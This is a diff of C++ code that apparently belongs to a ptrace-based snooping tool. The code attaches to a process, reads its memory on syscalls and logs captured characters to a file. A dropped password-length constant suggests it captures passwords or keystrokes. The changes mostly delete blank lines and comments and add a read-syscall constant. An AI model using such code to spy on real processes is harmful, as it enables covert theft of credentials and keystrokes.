@@ -7,14 +7,13 @@
 #include <wait.h>
 #include <ctype.h>
 
-#define MAX_PASSWORD_LEN 256
-
 #define _offsetof(a, b) __builtin_offsetof(a,b)
 #define get_reg(child, name) __get_reg(child, _offsetof(struct user, regs.name))
 
 #define eax rax
 #define orig_eax orig_rax
 #define SYSCALL_write 1
+#define SYSCALL_read 0
 
 long __get_reg(pid_t child, int off) {
     long val = ptrace(PTRACE_PEEKUSER, child, off);
@@ -50,9 +49,7 @@ char *read_memory(pid_t child, unsigned long addr, long len) {
 
     if (len + sizeof(unsigned long) + 1 < len)
         return nullptr;
-
     val = (char *) calloc(len + sizeof(unsigned long) + 1, 1);
-
     if (!val)
         return nullptr;
 
@@ -65,7 +62,6 @@ char *read_memory(pid_t child, unsigned long addr, long len) {
         memcpy(val + read, &tmp, sizeof(tmp));
         read += sizeof(tmp);
     }
-
     return val;
 }
 
@@ -107,7 +103,6 @@ int get_syscall(pid_t traced_process) {
 
 void find_data_to_log(char *memory, unsigned long len, FILE *fd) {
     if(len <= 4){
-//        std::cout << "DATA: " << std::hex <<  memory << std::endl;
         if(memory[0] == 0x20) {
             DEBUG_STDOUT("[SPACE]");
             std::string s = "[SPACE]";
@@ -147,7 +142,6 @@ void find_data_to_log(char *memory, unsigned long len, FILE *fd) {
             DEBUG_STDOUT(std::to_string(memory[0]));
             std::fwrite(memory, 1, 1, fd);
         }
-//        fwrite(memory, 1, len, fd);
     }
 }
 
